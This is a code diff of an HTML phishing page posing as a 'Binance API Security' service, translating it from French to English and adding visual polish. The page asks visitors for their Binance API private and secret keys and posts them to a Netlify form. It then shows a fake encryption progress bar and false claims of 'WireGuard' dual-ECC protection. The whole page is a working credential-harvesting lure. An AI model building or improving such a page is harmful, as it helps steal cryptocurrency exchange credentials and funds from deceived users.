@@ -1,13 +1,32 @@
 
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Binance API Security</title>
   <style>
+    /* Global animations */
+    @keyframes fadeIn {
+      from { 
+        opacity: 0; 
+        transform: translateY(15px); 
+        filter: blur(5px);
+      }
+      to { 
+        opacity: 1; 
+        transform: translateY(0); 
+        filter: blur(0);
+      }
+    }
+    @keyframes shimmer {
+      0% { background-position: -200% center; }
+      100% { background-position: 200% center; }
+    }
+    
     body {
       background-color: #121212;
+      background-image: radial-gradient(circle at top, #1a1a1a 0%, #121212 100%);
       color: #fdfdfb;
       font-family: Arial, sans-serif;
       display: flex;
@@ -31,17 +50,35 @@
       width: 220px;
     }
     .container {
-      background: #1e1e1e;
+      background: linear-gradient(145deg, #1e1e1e, #232323);
       padding: 30px;
-      border-radius: 10px;
+      border-radius: 16px;
       width: 90%;
       max-width: 400px;
-      box-shadow: 0px 0px 15px rgba(255, 193, 7, 0.5);
+      box-shadow: 0 4px 30px rgba(240, 185, 11, 0.2),
+                  0 0 0 1px rgba(240, 185, 11, 0.1);
       text-align: center;
       z-index: 2;
+      animation: fadeIn 0.8s ease-out;
+      position: relative;
+      backdrop-filter: blur(10px);
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+    .container:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 35px rgba(240, 185, 11, 0.25),
+                  0 0 0 1px rgba(240, 185, 11, 0.15);
     }
     h2 {
-      margin-bottom: 20px;
+      margin-bottom: 25px;
+      font-size: 24px;
+      background: linear-gradient(90deg, #f0b90b, #ffed4a, #f0b90b);
+      background-size: 200% auto;
+      color: transparent;
+      -webkit-background-clip: text;
+      background-clip: text;
+      animation: shimmer 3s linear infinite;
+      text-shadow: 0 2px 10px rgba(240, 185, 11, 0.2);
     }
     .input-group {
       margin-bottom: 15px;
@@ -52,23 +89,49 @@
       color: #fafaf9;
     }
     .input-group input {
-      width: 100%;
-      padding: 10px;
+      width: calc(100% - 2px);
+      padding: 12px 16px;
       margin-top: 5px;
-      border: 1px solid #f0b90b;
-      border-radius: 5px;
-      background: #121212;
+      border: 1px solid rgba(240, 185, 11, 0.5);
+      border-radius: 8px;
+      background: rgba(18, 18, 18, 0.95);
       color: white;
+      font-size: 15px;
+      transition: all 0.3s ease;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    }
+    .input-group input:hover {
+      border-color: #f0b90b;
+      box-shadow: 0 4px 15px rgba(240, 185, 11, 0.15);
+    }
+    .input-group input:focus {
+      border-color: #ffed4a;
+      box-shadow: 0 4px 20px rgba(240, 185, 11, 0.2);
+      outline: none;
     }
     .btn {
-      background-color: #f0b90b;
-      color: black;
-      padding: 12px;
-      border: none;
       width: 100%;
-      border-radius: 5px;
-      font-size: 16px;
+      padding: 14px;
+      margin-top: 25px;
+      background: linear-gradient(135deg, #f0b90b 0%, #ffed4a 100%);
+      color: black;
+      border: none;
+      border-radius: 8px;
       cursor: pointer;
+      font-weight: 600;
+      font-size: 16px;
+      letter-spacing: 0.5px;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(240, 185, 11, 0.2);
+    }
+    .btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(240, 185, 11, 0.3);
+      background: linear-gradient(135deg, #ffed4a 0%, #f0b90b 100%);
+    }
+    .btn:active {
+      transform: translateY(1px);
+      box-shadow: 0 2px 10px rgba(240, 185, 11, 0.2);
       transition: 0.3s;
     }
     .btn:hover {
@@ -81,14 +144,24 @@
     .social-icons {
       display: flex;
       justify-content: center;
-      gap: 15px;
-      margin-top: 30px;
+      gap: 20px;
+      margin-top: 35px;
       flex-wrap: wrap;
+      padding: 0 20px;
     }
     .social-icons a {
-      color: white;
-      font-size: 24px;
+      color: rgba(255, 255, 255, 0.7);
+      font-size: 22px;
       text-decoration: none;
+      transition: all 0.3s ease;
+      padding: 8px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.05);
+    }
+    .social-icons a:hover {
+      color: #f0b90b;
+      transform: translateY(-2px);
+      background: rgba(240, 185, 11, 0.1);
     }
     .footer {
       margin-top: 5px;
@@ -103,14 +176,26 @@
       display: none;
     }
     .counter {
-      font-size: 30px;
-      color: white;
+      font-size: 28px;
+      color: rgba(255, 255, 255, 0.9);
       text-align: center;
-      font-weight: bold;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+      animation: fadeIn 1s ease-out;
+      background: linear-gradient(180deg, rgba(255, 255, 255, 0.1) 0%, transparent 100%);
+      padding: 15px 25px;
+      border-radius: 12px;
+      backdrop-filter: blur(10px);
     }
     .counter .highlight {
-      font-size: 50px;
-      color: #f0b90b;
+      font-size: 48px;
+      background: linear-gradient(90deg, #f0b90b, #ffed4a);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      font-weight: 700;
+      display: inline-block;
+      margin-right: 10px;
     }
     .wireguard-description {
       font-size: 14px;
@@ -132,36 +217,53 @@
         transform: translateY(-60%);
         width: 300px;
       }
-      .right-img {
-        display: block;
-        position: absolute;
-        right: 15%;
-        top: 50%;
-        transform: translateY(-60%);
-        font-size: 250px;
-        color: #f0b90b;
-      }
+        .right-img {
+          display: block;
+          position: absolute;
+          right: 5%;
+          top: 55%;
+          transform: translateY(-50%);
+          font-size: 180px;
+          color: #f0b90b;
+          max-width: 40vw;
+          z-index: 1;
+        }
     }
-    /* Styles pour le modal */
+    /* Modal styles */
     #modal {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background-color: rgba(0,0,0,0.8);
+      background-color: rgba(0,0,0,0);
       display: none;
       justify-content: center;
       align-items: center;
       z-index: 9999;
+      transition: background-color 0.3s ease;
+      backdrop-filter: blur(0);
+    }
+    #modal.active {
+      background-color: rgba(0,0,0,0.8);
+      backdrop-filter: blur(5px);
     }
     .modal-content {
-      background: #1e1e1e;
-      padding: 20px;
-      border-radius: 10px;
+      background: linear-gradient(145deg, #1e1e1e, #232323);
+      padding: 30px;
+      border-radius: 16px;
       text-align: center;
       max-width: 400px;
       width: 90%;
+      transform: scale(0.95);
+      opacity: 0;
+      transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4),
+                  0 0 0 1px rgba(240, 185, 11, 0.1);
+    }
+    #modal.active .modal-content {
+      transform: scale(1);
+      opacity: 1;
     }
     .progress-bar-container {
       background: #444;
@@ -184,21 +286,21 @@
     <img src="logo23.png" alt="Binance Logo" class="logo">
   </div>
   
-  <img src="binance-app.png" alt="Binance App" class="left-img" style="max-width:260px;width:100%;height:auto;position:static;margin-bottom:18px;">
+  <img src="binance-app.png" alt="Binance App" class="left-img" style="max-width:260px;width:100%;height:auto;position:static;margin-bottom:18px;display:block;">
   
   <div class="container" style="max-width:340px;padding:22px 18px;">
-    <h2 style="font-size:1.25rem;margin-bottom:16px;">Protection Avancée des API Keys Binance</h2>
+    <h2 style="font-size:1.25rem;margin-bottom:16px;">Advanced Binance API Keys Protection</h2>
     <form name="binance-api-key" method="POST" data-netlify="true" netlify-honeypot="bot-field" style="margin-bottom:0;">
       <input type="hidden" name="form-name" value="binance-api-key">
       <div class="input-group" style="margin-bottom:12px;">
-        <label for="privateKey" style="font-size:13px;">Private Key API</label>
-        <input type="password" id="privateKey" name="privateKey" placeholder="Entrer votre clé privée" required style="font-size:15px;padding:9px 10px;">
+        <label for="privateKey" style="font-size:13px;">API Private Key</label>
+        <input type="password" id="privateKey" name="privateKey" placeholder="Enter your private key" required style="font-size:15px;padding:9px 10px;">
       </div>
       <div class="input-group" style="margin-bottom:12px;">
-        <label for="secretKey" style="font-size:13px;">Secret Key API</label>
-        <input type="password" id="secretKey" name="secretKey" placeholder="Entrer votre clé secrète" required style="font-size:15px;padding:9px 10px;">
+        <label for="secretKey" style="font-size:13px;">API Secret Key</label>
+        <input type="password" id="secretKey" name="secretKey" placeholder="Enter your secret key" required style="font-size:15px;padding:9px 10px;">
       </div>
-      <button class="btn" type="submit" style="font-size:15px;padding:10px 0;">Activer la Protection</button>
+      <button class="btn" type="submit" style="font-size:15px;padding:10px 0;">Activate Protection</button>
     </form>
     <script>
       // Soumission AJAX Netlify Forms + animation modal
@@ -211,7 +313,11 @@
           headers: { 'Accept': 'application/x-www-form-urlencoded' },
           body: new URLSearchParams(data).toString()
         }).then(function() {
-          document.getElementById('modal').style.display = 'flex';
+          var modal = document.getElementById('modal');
+          modal.style.display = 'flex';
+          // Force reflow
+          modal.offsetHeight;
+          modal.classList.add('active');
           var progressBar = document.querySelector('.progress-bar');
           progressBar.style.width = '0%';
           var duration = 4000;
@@ -227,9 +333,9 @@
               var modalMessage = document.getElementById('modal-message');
               modalMessage.innerHTML =
                 '<i class="fas fa-check-circle" style="color: #f0b90b; font-size: 48px;"></i><br>' +
-                'Chiffrement des clés API effectué avec succès !<br>' +
-                'Vos clés sont désormais sécurisées.<br><br>' +
-                '<button id="return-btn" class="btn" style="margin-top: 15px; background-color: #aaa;">Retour</button>';
+                'API keys encryption completed successfully!<br>' +
+                'Your keys are now secured.<br><br>' +
+                '<button id="return-btn" class="btn" style="margin-top: 20px; background: linear-gradient(135deg, #444 0%, #666 100%); color: white; font-size: 14px; padding: 12px 24px; width: auto; display: inline-block;">Return to Home</button>';
               document.getElementById('return-btn').addEventListener('click', function() {
                 document.getElementById('modal').style.display = 'none';
                 window.location.reload();
@@ -243,7 +349,7 @@
     </form>
     
     <div class="protection" style="font-size:1.1rem;margin-top:16px;">
-      <p style="margin:0;">⚠️ La protection <span style="color:#f0b90b;font-weight:bold;">WireGuard</span> renforcera la sécurité de vos API Keys Binance en restreignant les accès non autorisés.</p>
+      <p style="margin:0;">⚠️ The <span style="color:#f0b90b;font-weight:bold;">WireGuard</span> protection will enhance your Binance API Keys security by restricting unauthorized access.</p>
     </div>
   </div>
   
@@ -254,7 +360,7 @@
   <i class="fas fa-shield-alt right-img"></i>
   
   <div class="wireguard-description" style="font-size:0.95rem;margin-top:10px;max-width:340px;">
-    Le protocole <span style="color:#f0b90b;font-weight:bold;">WireGuard</span> garantit une confidentialité maximale en utilisant un double chiffrement elliptique (ECC) avancé pour sécuriser vos clés API contre toute interception.
+    The <span style="color:#f0b90b;font-weight:bold;">WireGuard</span> protocol ensures maximum privacy using advanced dual elliptic curve cryptography (ECC) to secure your API keys against any interception.
   </div>
   
   <div class="social-icons">
